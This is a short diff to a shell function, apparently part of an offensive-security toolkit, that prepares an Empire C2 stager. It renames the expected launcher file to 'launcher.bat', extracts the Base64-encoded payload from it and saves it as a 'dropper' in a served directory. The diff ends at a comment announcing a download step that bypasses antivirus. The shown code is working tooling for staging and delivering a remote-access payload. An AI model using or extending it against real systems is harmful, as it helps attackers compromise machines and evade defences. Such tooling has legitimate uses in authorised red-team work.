@@ -79,13 +79,13 @@ nb-srv-empire-stager() {
     nb-vars-set-lport
 
     # Path to generated Empire stager
-    __ask "Set the directory to Empire payload (without the filename)"
+    __ask "Set the directory to Empire launcher.bat payload (without the filename)"
     local d=$(__askpath DIR $HOME)
     [[ "$d" == "~"* ]] && __err "~ not allowed, use the full path" && return
-    dp="${d}/dropper"
+    dp="${d}/launcher.bat"
     
     # Encode the stager - grab the Base64 string out of the file and save it in a file called "dropper"
-    cat $dp | grep enc | tr " " "\n" | egrep -e '\S{30}+' > "$HOME/desktop/server/dropper"
+    cat "$dp" | grep enc | tr " " "\n" | egrep -e '\S{30}+' > "$HOME/desktop/server/dropper"
     __info "Stager \"dropper\" encoded."
 
     # Download the stager and bypass AV
